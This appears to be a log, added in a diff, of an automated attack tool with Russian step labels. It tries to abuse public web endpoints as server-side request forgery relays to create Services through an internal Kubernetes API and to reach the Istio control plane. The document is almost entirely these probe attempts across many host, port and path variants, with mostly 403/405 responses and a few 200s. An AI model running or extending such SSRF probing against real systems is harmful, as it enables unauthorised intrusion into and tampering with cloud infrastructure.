+[2025-12-10 17:52:44] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:44] [INFO] Creating Service via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/services
+[2025-12-10 17:52:45] [INFO]   Response status: 405
+[2025-12-10 17:52:45] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:45] [INFO] Creating Service via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/services
+[2025-12-10 17:52:46] [INFO]   Response status: 405
+[2025-12-10 17:52:46] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:46] [INFO] Creating Service via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/services
+[2025-12-10 17:52:47] [INFO]   Response status: 200
+[2025-12-10 17:52:47] [INFO]   Response: {}...
+[2025-12-10 17:52:47] [INFO] Creating Service via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc:443/api/v1/namespaces/default/services
+[2025-12-10 17:52:48] [INFO]   Response status: 200
+[2025-12-10 17:52:48] [INFO]   Response: {}...
+[2025-12-10 17:52:48] [INFO] Creating Service via: /zootopia-events/api/events/sites/1 -> https://10.96.0.1/api/v1/namespaces/default/services
+[2025-12-10 17:52:49] [INFO]   Response status: 200
+[2025-12-10 17:52:49] [INFO]   Response: {}...
+[2025-12-10 17:52:49] [INFO] Creating Service via: /zootopia-events/api/events/sites/1 -> http://kubernetes.default.svc/api/v1/namespaces/default/services
+[2025-12-10 17:52:49] [INFO]   Response status: 403
+[2025-12-10 17:52:49] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:49] [INFO] Creating Service via: /zootopia-events/api/events/sites/1 -> http://127.0.0.1:6443/api/v1/namespaces/default/services
+[2025-12-10 17:52:50] [INFO]   Response status: 403
+[2025-12-10 17:52:50] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:50] [INFO] Creating Service via: /zootopia-events/api/events/sites/1 -> http://localhost:6443/api/v1/namespaces/default/services
+[2025-12-10 17:52:50] [INFO]   Response status: 403
+[2025-12-10 17:52:50] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:50] [INFO] Creating Service via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/api/v1/namespaces/default/services
+[2025-12-10 17:52:51] [INFO]   Response status: 403
+[2025-12-10 17:52:51] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:51] [INFO] Creating Service via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/services
+[2025-12-10 17:52:51] [INFO]   Response status: 403
+[2025-12-10 17:52:51] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:51] [INFO] Creating Service via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/services
+[2025-12-10 17:52:52] [INFO]   Response status: 403
+[2025-12-10 17:52:52] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:52] [INFO] Creating Service via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/services
+[2025-12-10 17:52:52] [INFO]   Response status: 403
+[2025-12-10 17:52:52] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:52] [INFO] Creating Service via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/services
+[2025-12-10 17:52:53] [INFO]   Response status: 403
+[2025-12-10 17:52:53] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:53] [INFO] Creating Service via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc:443/api/v1/namespaces/default/services
+[2025-12-10 17:52:53] [INFO]   Response status: 403
+[2025-12-10 17:52:53] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:53] [INFO] Creating Service via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://10.96.0.1/api/v1/namespaces/default/services
+[2025-12-10 17:52:54] [INFO]   Response status: 403
+[2025-12-10 17:52:54] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:54] [INFO] Creating Service via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://kubernetes.default.svc/api/v1/namespaces/default/services
+[2025-12-10 17:52:54] [INFO]   Response status: 403
+[2025-12-10 17:52:54] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:54] [INFO] Creating Service via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://127.0.0.1:6443/api/v1/namespaces/default/services
+[2025-12-10 17:52:55] [INFO]   Response status: 403
+[2025-12-10 17:52:55] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:55] [INFO] Creating Service via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://localhost:6443/api/v1/namespaces/default/services
+[2025-12-10 17:52:55] [INFO]   Response status: 403
+[2025-12-10 17:52:55] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:55] [INFO] Creating Service via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/api/v1/namespaces/default/services
+[2025-12-10 17:52:56] [INFO]   Response status: 403
+[2025-12-10 17:52:56] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:56] [INFO] Creating Service via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/services
+[2025-12-10 17:52:57] [INFO]   Response status: 403
+[2025-12-10 17:52:57] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:57] [INFO] Creating Service via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/services
+[2025-12-10 17:52:57] [INFO]   Response status: 403
+[2025-12-10 17:52:57] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:57] [INFO] Creating Service via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/services
+[2025-12-10 17:52:58] [INFO]   Response status: 403
+[2025-12-10 17:52:58] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:58] [INFO] Creating Service via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/default/services
+[2025-12-10 17:52:58] [INFO]   Response status: 403
+[2025-12-10 17:52:58] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:58] [INFO] Creating Service via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc:443/api/v1/namespaces/default/services
+[2025-12-10 17:52:59] [INFO]   Response status: 403
+[2025-12-10 17:52:59] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:59] [INFO] Creating Service via: /myaccount/api/order-details/v3/feature-flags -> https://10.96.0.1/api/v1/namespaces/default/services
+[2025-12-10 17:52:59] [INFO]   Response status: 403
+[2025-12-10 17:52:59] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:52:59] [INFO] Creating Service via: /myaccount/api/order-details/v3/feature-flags -> http://kubernetes.default.svc/api/v1/namespaces/default/services
+[2025-12-10 17:53:00] [INFO]   Response status: 403
+[2025-12-10 17:53:00] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:00] [INFO] Creating Service via: /myaccount/api/order-details/v3/feature-flags -> http://127.0.0.1:6443/api/v1/namespaces/default/services
+[2025-12-10 17:53:00] [INFO]   Response status: 403
+[2025-12-10 17:53:00] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:00] [INFO] Creating Service via: /myaccount/api/order-details/v3/feature-flags -> http://localhost:6443/api/v1/namespaces/default/services
+[2025-12-10 17:53:01] [INFO]   Response status: 403
+[2025-12-10 17:53:01] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:01] [INFO] Creating Service via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/api/v1/namespaces/default/services
+[2025-12-10 17:53:01] [INFO]   Response status: 403
+[2025-12-10 17:53:01] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:01] [INFO] Creating Service via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/services
+[2025-12-10 17:53:02] [INFO]   Response status: 403
+[2025-12-10 17:53:02] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:02] [INFO] Creating Service via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/services
+[2025-12-10 17:53:02] [INFO]   Response status: 403
+[2025-12-10 17:53:02] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:02] [INFO] Creating Service via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/services
+[2025-12-10 17:53:03] [INFO]   Response status: 403
+[2025-12-10 17:53:03] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:03] [INFO] 
+======================================================================
+[2025-12-10 17:53:03] [INFO] ШАГ 5: Доступ к Istio Control Plane
+[2025-12-10 17:53:03] [INFO] ======================================================================
+[2025-12-10 17:53:03] [INFO] Testing Istio access: /semiprotected/api/checkout/state-api/v2/get -> https://istiod.istio-system.svc.cluster.local:15014
+[2025-12-10 17:53:03] [INFO]   Response status: 403
+[2025-12-10 17:53:03] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:03] [INFO] Testing Istio access: /semiprotected/api/checkout/state-api/v2/get -> http://istiod.istio-system.svc.cluster.local:15014
+[2025-12-10 17:53:04] [INFO]   Response status: 403
+[2025-12-10 17:53:04] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:04] [INFO] Testing Istio access: /semiprotected/api/checkout/state-api/v2/get -> https://istiod.istio-system.svc.cluster.local:15010
+[2025-12-10 17:53:04] [INFO]   Response status: 403
+[2025-12-10 17:53:04] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:04] [INFO] Testing Istio access: /semiprotected/api/checkout/state-api/v2/get -> http://istiod.istio-system.svc.cluster.local:15010
+[2025-12-10 17:53:05] [INFO]   Response status: 403
+[2025-12-10 17:53:05] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:05] [INFO] Testing Istio access: /zootopia-events/api/events/sites/1 -> https://istiod.istio-system.svc.cluster.local:15014
+[2025-12-10 17:53:05] [INFO]   Response status: 403
+[2025-12-10 17:53:05] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:05] [INFO] Testing Istio access: /zootopia-events/api/events/sites/1 -> http://istiod.istio-system.svc.cluster.local:15014
+[2025-12-10 17:53:06] [INFO]   Response status: 403
+[2025-12-10 17:53:06] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:06] [INFO] Testing Istio access: /zootopia-events/api/events/sites/1 -> https://istiod.istio-system.svc.cluster.local:15010
+[2025-12-10 17:53:07] [INFO]   Response status: 403
+[2025-12-10 17:53:07] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:07] [INFO] Testing Istio access: /zootopia-events/api/events/sites/1 -> http://istiod.istio-system.svc.cluster.local:15010
+[2025-12-10 17:53:07] [INFO]   Response status: 403
+[2025-12-10 17:53:07] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:07] [INFO] Testing Istio access: /leto-personalization/api/v1/personalization/events/sites/1 -> https://istiod.istio-system.svc.cluster.local:15014
+[2025-12-10 17:53:08] [INFO]   Response status: 403
+[2025-12-10 17:53:08] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:08] [INFO] Testing Istio access: /leto-personalization/api/v1/personalization/events/sites/1 -> http://istiod.istio-system.svc.cluster.local:15014
+[2025-12-10 17:53:08] [INFO]   Response status: 403
+[2025-12-10 17:53:08] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:08] [INFO] Testing Istio access: /leto-personalization/api/v1/personalization/events/sites/1 -> https://istiod.istio-system.svc.cluster.local:15010
+[2025-12-10 17:53:09] [INFO]   Response status: 403
+[2025-12-10 17:53:09] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:09] [INFO] Testing Istio access: /leto-personalization/api/v1/personalization/events/sites/1 -> http://istiod.istio-system.svc.cluster.local:15010
+[2025-12-10 17:53:09] [INFO]   Response status: 403
+[2025-12-10 17:53:09] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
